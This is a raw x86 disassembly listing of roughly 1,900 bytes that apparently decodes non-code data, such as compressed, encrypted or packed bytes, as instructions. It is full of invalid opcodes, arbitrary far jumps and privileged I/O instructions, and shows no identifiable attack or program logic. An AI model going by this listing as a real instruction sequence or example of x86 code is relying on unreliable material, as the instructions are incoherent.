  40c92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c92f:	add    eax,0xf80efcf1
  40c934:	and    BYTE PTR [esi],al
  40c936:	lds    esp,FWORD PTR [eax-0x32a9dbca]
  40c93c:	dec    edi
  40c93d:	inc    esp
  40c93e:	ret    0xafab
  40c941:	jmp    0xc658:0xf1fe7d2b
  40c948:	sub    al,0x50
  40c94a:	and    al,0x3
  40c94c:	xchg   esp,eax
  40c94d:	nop
  40c94e:	push   0x58
  40c950:	loope  0x40c92b
  40c952:	test   DWORD PTR [ebp-0x57],0x87da4eb2
  40c959:	mov    cs,WORD PTR [edx+0x13]
  40c95c:	jo     0x40c90c
  40c95e:	call   0x91ae07b7
  40c963:	pop    ebx
  40c964:	sbb    eax,0x207acdbf
  40c969:	inc    eax
  40c96a:	test   BYTE PTR [edx+0x7fc306f5],dl
  40c970:	inc    ecx
  40c971:	test   DWORD PTR [ecx],edx
  40c973:	call   0xa42adf04
  40c978:	test   ebx,ecx
  40c97a:	dec    esp
  40c97b:	jle    0x40c975
  40c97d:	sub    DWORD PTR [eax+esi*4-0x15622dac],esi
  40c984:	(bad)  
  40c985:	xchg   ebp,eax
  40c986:	push   ebp
  40c987:	cdq    
  40c988:	shl    BYTE PTR [edx+0x19f501c4],cl
  40c98e:	cmp    BYTE PTR ss:[edi],bl
  40c991:	mov    cl,0x29
  40c993:	add    BYTE PTR [edx-0x79],ch
  40c996:	jno    0x40c9fe
  40c998:	shl    edx,1
  40c99a:	and    DWORD PTR [eax],esi
  40c99c:	(bad)  
  40c99d:	aaa    
  40c99e:	retf   0x8c26
  40c9a1:	shl    DWORD PTR [ebp-0x9],1
  40c9a4:	xor    DWORD PTR [edi],ecx
  40c9a6:	xchg   DWORD PTR [esi],esi
  40c9a8:	sub    eax,0xad4ab99d
  40c9ad:	mov    ah,0x25
  40c9af:	mov    dh,0x3b
  40c9b1:	js     0x40ca20
  40c9b3:	push   es
  40c9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9b5:	mov    ds:0xbd033fb0,al
  40c9ba:	js     0x40c9e6
  40c9bc:	fcom   QWORD PTR ds:0x2bbfff92
  40c9c2:	jmp    0x40c980
  40c9c4:	add    al,0x1a
  40c9c6:	inc    ecx
  40c9c7:	clc    
  40c9c8:	mov    ebp,0xaad3567f
  40c9cd:	push   ebp
  40c9ce:	into   
  40c9cf:	pop    eax
  40c9d0:	adc    DWORD PTR [eax+0x43],0x9de1cf40
  40c9d7:	mov    ch,0x74
  40c9da:	fwait
  40c9db:	mov    al,0x2c
  40c9dd:	mov    bh,0x38
  40c9df:	pushf  
  40c9e0:	mov    ah,al
  40c9e2:	add    dh,al
  40c9e4:	mov    ch,0x77
  40c9e6:	jnp    0x40c9a0
  40c9e8:	(bad)  
  40c9e9:	jmp    0xa2176d5c
  40c9ee:	call   0x1dbc:0xdcbc32f2
  40c9f5:	mov    ebp,0x5ac7b910
  40c9fa:	sahf   
  40c9fb:	scas   al,BYTE PTR es:[edi]
  40c9fc:	cmp    edx,DWORD PTR [ebp-0x36a3915e]
  40ca02:	ins    DWORD PTR es:[edi],dx
  40ca03:	mov    bh,0x78
  40ca05:	pushf  
  40ca06:	jae    0x40ca4e
  40ca08:	daa    
  40ca09:	dec    ebp
  40ca0a:	out    0xbc,al
  40ca0c:	jns    0x40c9bb
  40ca0e:	daa    
  40ca0f:	or     ax,0xa416
  40ca13:	adc    ecx,eax
  40ca15:	rcl    DWORD PTR [ebp+0x6d],cl
  40ca18:	retf   0x280c
  40ca1b:	jae    0x40ca5b
  40ca1d:	push   eax
  40ca1e:	ret    0x773e
  40ca21:	out    dx,al
  40ca22:	pop    es
  40ca23:	xor    dh,BYTE PTR [ecx+0x644f2be5]
  40ca29:	aaa    
  40ca2a:	xchg   ecx,eax
  40ca2b:	push   ebx
  40ca2c:	add    DWORD PTR [edi+0x59],ebp
  40ca2f:	mov    esi,0x9e4fd363
  40ca34:	clc    
  40ca35:	or     ch,BYTE PTR ds:0xdc82e99
  40ca3b:	stos   DWORD PTR es:[edi],eax
  40ca3c:	and    eax,0xd434df74
  40ca41:	mov    dl,0x25
  40ca43:	cmp    al,ah
  40ca45:	pop    es
  40ca46:	ror    BYTE PTR [ecx-0x29a1f529],1
  40ca4c:	xchg   DWORD PTR [esi-0x61],edi
  40ca4f:	or     al,0x3c
  40ca51:	xchg   DWORD PTR ds:0x9c5c4311,esi
  40ca57:	mov    ch,BYTE PTR [ecx+edi*8-0x80]
  40ca5b:	dec    ecx
  40ca5c:	popa   
  40ca5d:	fwait
  40ca5e:	and    bh,BYTE PTR [eax+0x2e]
  40ca61:	shr    edi,0xd9
  40ca64:	fcmovb st,st(1)
  40ca66:	jnp    0x40ca0a
  40ca68:	je     0x40ca03
  40ca6a:	leave  
  40ca6b:	out    dx,al
  40ca6c:	lea    edx,[ebx+edx*8]
  40ca6f:	add    al,0x6c
  40ca71:	add    eax,0x3f6fd34a
  40ca76:	je     0x40caa7
  40ca78:	pop    ds
  40ca79:	xchg   esp,eax
  40ca7a:	or     dh,BYTE PTR [edx-0x3028b0ed]
  40ca80:	repnz adc edx,0x6576dae9
  40ca87:	outs   dx,DWORD PTR ds:[esi]
  40ca88:	mov    al,ds:0xcf0cd02e
  40ca8d:	xchg   ebp,eax
  40ca8e:	pop    eax
  40ca8f:	test   BYTE PTR [edx-0x11],0xdd
  40ca93:	or     edx,ebp
  40ca95:	(bad)  
  40ca96:	mov    eax,ds:0xbcce549b
  40ca9b:	aad    0xbe
  40ca9d:	push   ss
  40ca9e:	pushf  
  40ca9f:	js     0x40ca7f
  40caa1:	(bad)  [ecx]
  40caa3:	in     al,dx
  40caa4:	cmp    BYTE PTR ds:0xab0ad60f,0x12
  40caab:	aas    
  40caac:	mov    esi,ebx
  40caae:	cmp    DWORD PTR [edx+0x1ca87ef7],edx
  40cab4:	repnz and eax,0x52961324
  40caba:	dec    bl
  40cabc:	outs   dx,DWORD PTR ds:[esi]
  40cabd:	out    0x9e,eax
  40cabf:	jmp    0x7c7706bd
  40cac4:	enter  0xd73e,0x79
  40cac8:	jle    0x40ca93
  40caca:	ins    DWORD PTR es:[edi],dx
  40cacb:	adc    al,0xc9
  40cacd:	or     eax,0xdae6e656
  40cad2:	pusha  
  40cad3:	je     0x40cb2b
  40cad5:	push   ebp
  40cad6:	test   eax,0xcf72e20d
  40cadb:	and    ebx,DWORD PTR [eax+0x13]
  40cade:	dec    eax
  40cadf:	es aaa 
  40cae1:	in     eax,0xa9
  40cae3:	bound  edx,QWORD PTR [ecx]
  40cae5:	call   0x149f:0xedcf8066
  40caec:	push   edi
  40caed:	icebp  
  40caee:	int    0xea
  40caf0:	lods   al,BYTE PTR ds:[esi]
  40caf2:	push   edx
  40caf3:	sub    BYTE PTR [ecx+eiz*8+0x7627cbb4],dl
  40cafa:	inc    DWORD PTR ds:0x5c6e1e98
  40cb00:	loop   0x40cae2
  40cb02:	data16 clc 
  40cb04:	sbb    eax,0x84871ebd
  40cb09:	or     DWORD PTR [edi+edi*8-0x779e3ee7],ecx
  40cb10:	lock and al,0xfc
  40cb13:	mov    eax,0x69d8b7da
  40cb18:	ret    
  40cb19:	outs   dx,DWORD PTR ds:[esi]
  40cb1a:	pop    es
  40cb1b:	mov    cl,0x95
  40cb1d:	cmp    esi,ecx
  40cb1f:	mov    edi,0xbc76e59d
  40cb24:	xchg   BYTE PTR [eax-0x21],dl
  40cb27:	xchg   edx,eax
  40cb28:	out    dx,al
  40cb29:	push   es
  40cb2a:	jg     0x40cafa
  40cb2c:	enter  0x3abe,0xa2
  40cb30:	std    
  40cb31:	sub    al,0x1
  40cb33:	mov    WORD PTR [ebp-0x63],?
  40cb36:	(bad)  
  40cb37:	stos   DWORD PTR es:[edi],eax
  40cb38:	add    BYTE PTR ds:0x17bdfffb,0x24
  40cb3f:	loop   0x40cb9e
  40cb41:	xor    dh,ah
  40cb43:	mov    ch,0xca
  40cb45:	adc    ah,ch
  40cb47:	dec    ecx
  40cb48:	daa    
  40cb49:	shl    BYTE PTR [ebp+0x21],0x13
  40cb4d:	into   
  40cb4e:	mov    ds:0x2eae48b6,eax
  40cb53:	pop    esi
  40cb54:	cmp    edx,DWORD PTR [ecx+esi*2]
  40cb57:	(bad)  
  40cb58:	push   esp
  40cb59:	adc    DWORD PTR [esi+0x5e729ae4],ecx
  40cb5f:	cmp    ecx,DWORD PTR [eax-0x8f786b5]
  40cb65:	sti    
  40cb66:	or     BYTE PTR cs:[edi],ch
  40cb69:	and    BYTE PTR ds:0xa692830a,0x57
  40cb70:	imul   ebx,DWORD PTR [ecx-0x22],0xb00497fa
  40cb77:	test   DWORD PTR [edi],esp
  40cb79:	jbe    0x40cb92
  40cb7b:	push   cs
  40cb7c:	iret   
  40cb7d:	arpl   WORD PTR [ebx],dx
  40cb7f:	mov    ecx,DWORD PTR [edi-0x19]
  40cb82:	mov    dh,0xd7
  40cb84:	mov    cl,dh
  40cb86:	sbb    DWORD PTR [ebx-0x63],esp
  40cb89:	pop    esp
  40cb8a:	shr    DWORD PTR [esp+ebp*1-0x4c5f6b41],cl
  40cb91:	out    0xd5,al
  40cb93:	outs   dx,BYTE PTR ds:[esi]
  40cb94:	xchg   edx,eax
  40cb95:	nop
  40cb96:	call   0x1e59b98
  40cb9b:	out    dx,al
  40cb9c:	outs   dx,BYTE PTR ds:[esi]
  40cb9d:	jns    0x40cb9a
  40cb9f:	add    ecx,0x5d
  40cba2:	enter  0xe1db,0x58
  40cba6:	jbe    0x40cbed
  40cba8:	add    al,0x57
  40cbaa:	mov    ebx,0x515a6f94
  40cbaf:	jo     0x40cbf2
  40cbb1:	inc    esi
  40cbb2:	test   ebp,ebx
  40cbb4:	(bad)  
  40cbb5:	push   ss
  40cbb6:	or     esp,DWORD PTR ds:0xae004361
  40cbbc:	(bad)  
  40cbbe:	pop    es
  40cbbf:	push   esi
  40cbc0:	add    al,BYTE PTR cs:[eax+ebp*8]
  40cbc4:	(bad)  
  40cbc5:	repnz or al,0x11
  40cbc8:	inc    esi
  40cbc9:	test   eax,0x37e29af2
  40cbce:	fwait
  40cbcf:	pop    ebx
  40cbd0:	sbb    DWORD PTR [edx-0x65],edx
  40cbd3:	test   BYTE PTR [ecx-0x39],ch
  40cbd6:	inc    esp
  40cbd7:	in     al,dx
  40cbd8:	cwde   
  40cbd9:	ret    
  40cbda:	inc    eax
  40cbdb:	aas    
  40cbdc:	mov    ecx,DWORD PTR [eax]
  40cbde:	or     al,0x79
  40cbe0:	cmp    ebp,DWORD PTR [esi+0x4f]
  40cbe3:	push   ebx
  40cbe4:	push   esp
  40cbe5:	imul   ebx,DWORD PTR [eax+0x0],0x3d710f2b
  40cbec:	sbb    dl,BYTE PTR [edi+0xb9cdd4c]
  40cbf2:	call   0x8db0:0xea50e41f
  40cbf9:	push   es
  40cbfa:	ja     0x40cbcc
  40cbfc:	shr    DWORD PTR [esi-0x69],1
  40cbff:	int3   
  40cc00:	mov    ah,0x35
  40cc02:	mov    bh,0x18
  40cc04:	data16 xor dl,BYTE PTR [eax+0x22]
  40cc08:	mov    ch,dh
  40cc0a:	add    DWORD PTR [edx-0x29],esp
  40cc0d:	rsm    
  40cc0f:	inc    ebx
  40cc10:	sahf   
  40cc11:	leave  
  40cc12:	fcomip st,st(6)
  40cc14:	imul   ecx,DWORD PTR [esi+0x37],0x4
  40cc18:	adc    esp,esi
  40cc1a:	test   eax,0x2a330daa
  40cc1f:	retf   0x3bfa
  40cc22:	xchg   DWORD PTR [edi],edi
  40cc24:	xchg   DWORD PTR [ecx-0x4b],ebp
  40cc27:	dec    eax
  40cc28:	dec    esi
  40cc29:	aas    
  40cc2a:	out    0x31,eax
  40cc2c:	cmc    
  40cc2d:	jmp    0xc51f:0x82aba370
  40cc34:	cmp    esp,DWORD PTR [edi+edx*1]
  40cc37:	movmskps esp,xmm7
  40cc3a:	sub    eax,0x9a639350
  40cc3f:	cmp    eax,DWORD PTR [esi-0x23fc3678]
  40cc45:	arpl   ax,si
  40cc47:	mov    bh,BYTE PTR [eax]
  40cc49:	retf   
  40cc4a:	pop    ds
  40cc4b:	and    eax,0x547670b5
  40cc50:	dec    eax
  40cc51:	cdq    
  40cc52:	cmp    DWORD PTR [edi],eax
  40cc54:	bound  eax,QWORD PTR [ebp+0x4bc0b06b]
  40cc5a:	imul   esi,eax,0xffffffdd
  40cc5d:	inc    esi
  40cc5e:	mov    dl,0xfa
  40cc60:	xor    BYTE PTR [ecx],cl
  40cc62:	push   es
  40cc63:	jmp    0xd33a:0x3fb654bb
  40cc6a:	dec    edx
  40cc6b:	adc    BYTE PTR [ecx-0x64],0x87
  40cc6f:	sub    al,0x5
  40cc71:	cmp    ecx,DWORD PTR [eax-0x6]
  40cc74:	mov    gs,WORD PTR [esi+0x420cdc41]
  40cc7a:	je     0x40cc83
  40cc7c:	add    ebx,DWORD PTR [ebx-0x60ec0c05]
  40cc82:	pop    ecx
  40cc83:	in     al,dx
  40cc84:	cld    
  40cc85:	mov    ebx,0x77659550
  40cc8a:	mov    edi,0xaa4e3be8
  40cc8f:	std    
  40cc90:	(bad)  
  40cc91:	into   
  40cc92:	and    BYTE PTR [edi+0x25],dl
  40cc95:	fiadd  DWORD PTR ds:0x75a776f9
  40cc9b:	push   ds
  40cc9c:	push   esi
  40cc9d:	add    eax,0xe634b648
  40cca2:	les    ebp,FWORD PTR [edx+0x38]
  40cca5:	js     0x40cd09
  40cca7:	push   ebx
  40cca8:	daa    
  40cca9:	xor    eax,0x45eb0542
  40ccae:	xchg   BYTE PTR [eiz*8-0x6ab3ec53],bh
  40ccb5:	bound  ebp,QWORD PTR [eax]
  40ccb7:	and    dl,BYTE PTR [edx+0x7d]
  40ccba:	(bad)  
  40ccbb:	fwait
  40ccbc:	xor    DWORD PTR [ebp*2+0x642c0545],esp
  40ccc3:	adc    ch,BYTE PTR [ebp-0x4c]
  40ccc6:	pop    edi
  40ccc7:	adc    cl,dl
  40ccc9:	inc    ebx
  40ccca:	pusha  
  40cccb:	sbb    edx,DWORD PTR [edi]
  40cccd:	xor    DWORD PTR [ecx-0x3],eax
  40ccd0:	cdq    
  40ccd1:	xor    BYTE PTR [eax-0x2b],dl
  40ccd4:	jl     0x40cc79
  40ccd6:	add    eax,0xb3213e80
  40ccdb:	call   0x1baeb4c
  40cce0:	or     BYTE PTR [eax],0xb
  40cce3:	sbb    DWORD PTR [ebx],ecx
  40cce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce6:	aam    0xac
  40cce8:	pop    ecx
  40cce9:	cld    
  40ccea:	cwde   
  40cceb:	sbb    eax,0x6f49db0c
  40ccf0:	icebp  
  40ccf1:	icebp  
  40ccf2:	pushf  
  40ccf3:	test   al,0x3a
  40ccf5:	sbb    esi,ecx
  40ccf7:	xchg   ebp,eax
  40ccf8:	ja     0x40cca7
  40ccfa:	loope  0x40cd49
  40ccfc:	push   es
  40ccfd:	pop    edi
  40ccfe:	leave  
  40ccff:	jge    0x40cd7f
  40cd01:	jp     0x40cd0e
  40cd03:	jmp    0xbb73805
  40cd08:	sub    eax,0x1d03f476
  40cd0d:	mov    al,ds:0xc40fe722
  40cd12:	push   ds
  40cd13:	pop    eax
  40cd14:	daa    
  40cd15:	and    eax,0xf23871a1
  40cd1a:	ja     0x40ccb2
  40cd1c:	adc    BYTE PTR [edi+edx*4+0x3a],bl
  40cd20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd21:	stc    
  40cd22:	adc    al,0x9a
  40cd24:	shr    edi,0xdf
  40cd27:	cmc    
  40cd28:	inc    ebx
  40cd29:	(bad)  
  40cd2a:	dec    ebx
  40cd2b:	rcl    DWORD PTR [esi+0x5793a25],1
  40cd31:	pop    esp
  40cd32:	push   cs
  40cd33:	mov    ds:0x44a5cd8e,eax
  40cd38:	dec    ebx
  40cd39:	jle    0x40cd73
  40cd3b:	out    0x23,eax
  40cd3d:	cmp    BYTE PTR [edi-0x178c8d3a],bl
  40cd43:	in     eax,dx
  40cd44:	add    BYTE PTR [esp+eiz*4],0x49
  40cd48:	cld    
  40cd49:	mov    al,0xf3
  40cd4b:	xor    ecx,esi
  40cd4d:	dec    edi
  40cd4f:	push   edi
  40cd50:	xlat   BYTE PTR ds:[ebx]
  40cd51:	inc    edx
  40cd52:	call   0x20a7:0x465a700a
  40cd59:	xchg   ecx,eax
  40cd5a:	adc    eax,0x2148fcc4
  40cd5f:	sbb    BYTE PTR [eax+eiz*8],ch
  40cd62:	push   eax
  40cd63:	(bad)  
  40cd64:	xchg   esp,eax
  40cd65:	imul   esp,DWORD PTR [ebp-0x1e0b3de5],0xae5edaaf
  40cd6f:	fsubr  QWORD PTR [ecx+0x38]
  40cd72:	ss push ecx
  40cd74:	leave  
  40cd75:	and    al,0xfa
  40cd77:	es test eax,0x671bd837
  40cd7d:	sbb    eax,0x987efd16
  40cd82:	scas   al,BYTE PTR es:[edi]
  40cd83:	dec    edi
  40cd84:	(bad)  
  40cd85:	mov    eax,ds:0xd44147c3
  40cd8a:	push   ebp
  40cd8b:	dec    edi
  40cd8c:	xchg   ecx,eax
  40cd8d:	rcl    DWORD PTR [edx-0x73],1
  40cd90:	push   esi
  40cd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd92:	test   BYTE PTR [ecx],0x8b
  40cd95:	mov    al,ds:0x596984db
  40cd9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd9b:	xor    DWORD PTR [eax-0x51fb72c],0xcdabdddd
  40cda5:	into   
  40cda6:	mov    cl,BYTE PTR [edx+0x308583d4]
  40cdac:	mov    ecx,0xc024efb5
  40cdb1:	jle    0x40cd40
  40cdb3:	ret    
  40cdb4:	xor    cl,bl
  40cdb6:	jae    0x40cdc5
  40cdb8:	mov    ds:0xeaf0db92,al
  40cdbd:	mov    eax,0x6b88524c
  40cdc2:	jmp    0x40ce1f
  40cdc4:	adc    al,0x89
  40cdc6:	rcr    BYTE PTR [ebp-0x3e],0x3c
  40cdca:	out    0xb7,al
  40cdcc:	adc    edx,DWORD PTR [edx-0x6e]
  40cdcf:	pushf  
  40cdd0:	sti    
  40cdd1:	jecxz  0x40ce10
  40cdd3:	xchg   cl,dh
  40cdd5:	mov    ds:0xea6db4c1,al
  40cdda:	cli    
  40cddb:	stos   DWORD PTR es:[edi],eax
  40cddc:	fisub  WORD PTR [ebx]
  40cdde:	clc    
  40cddf:	mov    ds:0x10c83994,al
  40cde4:	inc    esp
  40cde5:	test   eax,0xd6952dd3
  40cdea:	add    DWORD PTR [ebx+0x46],edi
  40cded:	lea    ebx,[ecx+0x4476ccb9]
  40cdf3:	mov    DWORD PTR [ecx+0x17],esp
  40cdf6:	sbb    eax,DWORD PTR [esi+0x3fc3d684]
  40cdfc:	sbb    ecx,DWORD PTR [edx-0x60]
  40cdff:	ss push esi
  40ce01:	popf   
  40ce02:	mov    ch,0xa9
  40ce04:	cmc    
  40ce05:	and    dl,BYTE PTR [ecx-0x6279915f]
  40ce0b:	sub    BYTE PTR [edx-0x6f78ca9c],dh
  40ce11:	sub    ah,dl
  40ce13:	and    al,BYTE PTR [esi-0x2c]
  40ce16:	outs   dx,DWORD PTR ds:[esi]
  40ce17:	sub    ecx,ebp
  40ce19:	cdq    
  40ce1a:	out    dx,al
  40ce1b:	pop    ds
  40ce1c:	mov    ds:0x8cc0fe3f,eax
  40ce21:	xchg   ebp,eax
  40ce22:	push   cs
  40ce23:	jp     0x40ce02
  40ce25:	cmp    al,0x91
  40ce27:	add    ebx,DWORD PTR [esi+0x27c05dd2]
  40ce2d:	jo     0x40cea7
  40ce2f:	and    ah,bh
  40ce31:	outs   dx,BYTE PTR ds:[esi]
  40ce32:	dec    ebx
  40ce33:	push   0xffffffd9
  40ce35:	mov    BYTE PTR [esp+esi*2],dh
  40ce38:	adc    al,0x62
  40ce3a:	xchg   ebx,eax
  40ce3b:	and    DWORD PTR [ebp-0x57eecfa],esi
  40ce41:	adc    edx,DWORD PTR [ebp-0x2a]
  40ce44:	(bad)  
  40ce45:	in     eax,dx
  40ce46:	add    eax,0xba369ebd
  40ce4b:	lds    esi,FWORD PTR [edx-0x19]
  40ce4e:	fucomip st,st(0)
  40ce50:	and    esi,edi
  40ce52:	push   edx
  40ce53:	jae    0x40ce61
  40ce55:	stos   BYTE PTR es:[edi],al
  40ce56:	or     BYTE PTR [edi+0x46],dh
  40ce59:	mov    BYTE PTR [ecx-0xdd7db16],ch
  40ce5f:	daa    
  40ce60:	sub    BYTE PTR [eax],cl
  40ce62:	idiv   DWORD PTR es:[edi-0x6a]
  40ce66:	mov    al,ds:0x1caf4b77
  40ce6b:	shr    BYTE PTR [edi+0x32],0xe7
  40ce6f:	and    al,bl
  40ce71:	out    0x4d,al
  40ce73:	inc    ebp
  40ce74:	imul   esi,DWORD PTR [eax-0x2416566b],0x16
  40ce7b:	(bad)  
  40ce7c:	ret    0x6cca
  40ce7f:	ins    BYTE PTR es:[edi],dx
  40ce80:	sub    eax,0xb825d753
  40ce85:	cmp    al,0xa7
  40ce87:	mov    dh,BYTE PTR [ebp+0x2a]
  40ce8a:	pop    ebx
  40ce8b:	jle    0x40ce25
  40ce8d:	es sahf 
  40ce8f:	out    dx,al
  40ce90:	ss loopne 0x40ce72
  40ce93:	shr    DWORD PTR [edx-0x2f],1
  40ce96:	cmp    eax,DWORD PTR [ecx]
  40ce98:	or     eax,0xf143c2ae
  40ce9d:	mov    cl,0xea
  40ce9f:	and    ebp,DWORD PTR [eax+ebx*4]
  40cea2:	or     al,0x34
  40cea4:	jp     0x40ce70
  40cea6:	test   DWORD PTR ds:0x8c0e3f35,ebx
  40ceac:	push   esi
  40cead:	sbb    ah,BYTE PTR [ecx-0x5fcff7f0]
  40ceb3:	pushf  
  40ceb4:	push   edi
  40ceb5:	popa   
  40ceb6:	pop    esp
  40ceb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb8:	out    dx,al
  40ceb9:	cs aad 0xbc
  40cebc:	enter  0xf9,0xd
  40cec0:	mov    ah,0x2f
  40cec2:	loop   0x40ce54
  40cec4:	inc    esi
  40cec5:	shl    DWORD PTR [ebx+0x7ebb0dce],1
  40cecb:	mov    ah,0x57
  40cecd:	(bad)  
  40cece:	in     eax,0x6b
  40ced0:	shl    dh,0x65
  40ced3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ced4:	mov    BYTE PTR [edi+eiz*4-0xd27775a],cl
  40cedb:	pop    edi
  40cedc:	xchg   esp,eax
  40cedd:	ins    BYTE PTR es:[edi],dx
  40cede:	ins    DWORD PTR es:[edi],dx
  40cedf:	cmp    bh,bh
  40cee1:	ja     0x40cf57
  40cee3:	or     edx,DWORD PTR [esi-0xc]
  40cee6:	add    eax,0xc88ece80
  40ceeb:	xor    eax,DWORD PTR [ebx+0x3d]
  40ceee:	xlat   BYTE PTR ds:[ebx]
  40ceef:	jmp    0xaf86bb68
  40cef4:	add    al,0xb0
  40cef6:	push   esi
  40cef7:	bound  ecx,QWORD PTR [ebp-0x30]
  40cefa:	(bad)  
  40cefb:	loopne 0x40cee3
  40cefd:	shl    bh,cl
  40ceff:	fdivr  DWORD PTR [esi]
  40cf01:	dec    edi
  40cf02:	(bad)  
  40cf03:	and    bl,BYTE PTR [esi+0x2d345e0d]
  40cf09:	add    eax,0x9ab92bbf
  40cf0e:	add    DWORD PTR [esi+esi*8],eax
  40cf11:	neg    esp
  40cf13:	clc    
  40cf14:	inc    ebx
  40cf15:	mov    dl,0x4b
  40cf17:	aas    
  40cf18:	mov    eax,ds:0x47e7e398
  40cf1d:	dec    ebp
  40cf1e:	sbb    eax,0x22dc8f90
  40cf23:	popf   
  40cf24:	fsubr  DWORD PTR [ebx+0x1d]
  40cf27:	sahf   
  40cf28:	fs cld 
  40cf2a:	mov    al,0xe7
  40cf2c:	dec    ebp
  40cf2d:	xchg   ebx,eax
  40cf2e:	sti    
  40cf2f:	lods   eax,DWORD PTR ds:[esi]
  40cf30:	adc    al,0x79
  40cf32:	adc    DWORD PTR [edx+0x2b],ecx
  40cf35:	and    BYTE PTR [esi-0x1a],ch
  40cf38:	(bad)  
  40cf3a:	or     BYTE PTR [edx+eiz*4+0x9],dl
  40cf3e:	jbe    0x40cf82
  40cf40:	mov    WORD PTR [edx],?
  40cf42:	call   0xdaa:0x9df90014
  40cf49:	fdivr  DWORD PTR [edx-0x1a]
  40cf4c:	xor    BYTE PTR [ebx-0x26],al
  40cf4f:	mov    BYTE PTR [eax],dl
  40cf51:	rcl    di,1
  40cf54:	in     al,dx
  40cf55:	enter  0x9d4,0x96
  40cf59:	imul   esi,esi,0xfffffff9
  40cf5c:	jge    0x40cef4
  40cf5e:	push   0xffffffc1
  40cf60:	adc    eax,0x42026ad0
  40cf65:	scas   eax,DWORD PTR es:[edi]
  40cf66:	mov    al,0xe5
  40cf68:	add    bl,al
  40cf6a:	fmul   DWORD PTR [edx]
  40cf6c:	and    bh,bh
  40cf6e:	jge    0x40cf61
  40cf70:	sub    DWORD PTR [eax],edi
  40cf72:	call   0xcfc14703
  40cf77:	repnz inc eax
  40cf79:	xchg   esi,eax
  40cf7a:	aas    
  40cf7b:	imul   dh
  40cf7d:	cli    
  40cf7e:	jle    0x40cf73
  40cf80:	xor    ecx,0xe7408b38
  40cf86:	mov    bl,bl
  40cf88:	jae    0x40cf24
  40cf8a:	daa    
  40cf8b:	or     DWORD PTR gs:[esi],esi
  40cf8e:	ja     0x40cf7b
  40cf90:	fnsave [esi]
  40cf92:	sub    DWORD PTR [ebp+0x58],edi
  40cf95:	push   ebp
  40cf96:	icebp  
  40cf97:	mov    bl,0x19
  40cf99:	call   0x10a725f0
  40cf9e:	xchg   edi,eax
  40cf9f:	gs inc edi
  40cfa1:	repnz aaa 
  40cfa3:	sub    al,0x38
  40cfa5:	fwait
  40cfa6:	lahf   
  40cfa7:	xor    dh,BYTE PTR [edx-0x58]
  40cfaa:	and    ch,bl
  40cfac:	or     esp,DWORD PTR [esi-0x34]
  40cfaf:	add    DWORD PTR [ecx],edi
  40cfb1:	cwde   
  40cfb2:	std    
  40cfb3:	sbb    esp,DWORD PTR [ebx+0x5c1c1bc7]
  40cfb9:	cs sbb eax,0xb5c5bdb3
  40cfbf:	retf   
  40cfc0:	adc    ecx,ebx
  40cfc2:	sbb    eax,0x758a84d1
  40cfc7:	xchg   ecx,eax
  40cfc8:	out    0xd,al
  40cfca:	lea    esp,[ecx+0x51]
  40cfcd:	imul   BYTE PTR [ebx-0x19]
  40cfd0:	dec    esp
  40cfd1:	sub    eax,0x22934a2a
  40cfd6:	xor    al,0xe0
  40cfd8:	test   eax,0xdd1488d8
  40cfdd:	jbe    0x40cfd3
  40cfdf:	or     ebx,ebp
  40cfe1:	test   BYTE PTR [eax+0x1e],bl
  40cfe4:	push   0xe64a100c
  40cfe9:	pushf  
  40cfea:	lea    eax,[edx+0x64]
  40cfed:	scas   eax,DWORD PTR es:[edi]
  40cfee:	xor    eax,0x4b16b9b0
  40cff3:	jle    0x40d045
  40cff5:	ficom  WORD PTR [edx+0x5b]
  40cff8:	and    DWORD PTR [ecx+0x10d39ac5],ebp
  40cffe:	out    0x2f,al
  40d000:	xchg   ebp,eax
  40d001:	fstp   DWORD PTR [edi+0x77804055]
  40d007:	mov    ds:0xc1fee621,eax
  40d00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d00d:	test   BYTE PTR [ebx+esi*4],bl
  40d010:	sub    DWORD PTR [eax+ebp*4],0xffffffaf
  40d014:	push   edx
  40d015:	cmc    
  40d016:	xchg   ebx,eax
  40d017:	cmp    DWORD PTR [edi],edx
  40d019:	push   edx
  40d01a:	aas    
  40d01b:	sub    eax,DWORD PTR [esi+0x8]
  40d01e:	jg     0x40d04f
  40d020:	inc    esi
  40d021:	xor    cl,BYTE PTR [ecx+0x22e6ede9]
  40d027:	retf   0x975
  40d02a:	lods   al,BYTE PTR ds:[esi]
  40d02b:	outs   dx,BYTE PTR ds:[esi]
  40d02c:	popa   
  40d02d:	xchg   esp,edi
  40d02f:	mov    ds:0xadae55a2,al
  40d034:	jne    0x40cfdc
  40d036:	fs push cs
  40d038:	push   cs
  40d039:	ret    
  40d03a:	jge    0x40d099
  40d03c:	adc    ah,ah
  40d03e:	and    DWORD PTR [edx],ebx
  40d040:	aas    
  40d041:	push   cs
  40d042:	sub    al,0x94
  40d044:	(bad)  
  40d045:	xlat   BYTE PTR ds:[ebx]
  40d046:	xchg   edx,eax
  40d047:	mov    esi,0x469e25c4
  40d04c:	mov    ds:0xafa5e995,eax
  40d051:	ds mov ebx,fs
  40d054:	fnstenv [eax+edi*8+0x21]
  40d058:	int    0x8a
  40d05a:	idiv   ch
  40d05c:	nop
  40d05d:	pusha  
  40d05e:	fidivr WORD PTR [ebp-0x25]
  40d061:	fiadd  WORD PTR [ebx+0x33]
  40d064:	and    al,0xbf
  40d066:	inc    edi
  40d067:	xchg   edx,eax
  40d068:	dec    edi
  40d069:	sub    al,0x49
  40d06b:	mov    bl,0xd8
  40d06d:	cmp    bh,al
  40d06f:	jnp    0x40d05f
  40d071:	mov    WORD PTR [ebx],ss
  40d073:	sbb    al,al
  40d075:	ja     0x40d083
  40d077:	jl     0x40d0e2
  40d079:	jns    0x40d0c9
  40d07b:	(bad)  
  40d07c:	cmp    BYTE PTR ds:0x11f07a2b,dl
  40d082:	ins    DWORD PTR es:[edi],dx
  40d083:	jae    0x40d0e5
  40d085:	jecxz  0x40d09c
  40d087:	mov    ecx,0x2bd9366c
  40d08c:	icebp  
  40d08d:	dec    esi
  40d08e:	stos   BYTE PTR es:[edi],al
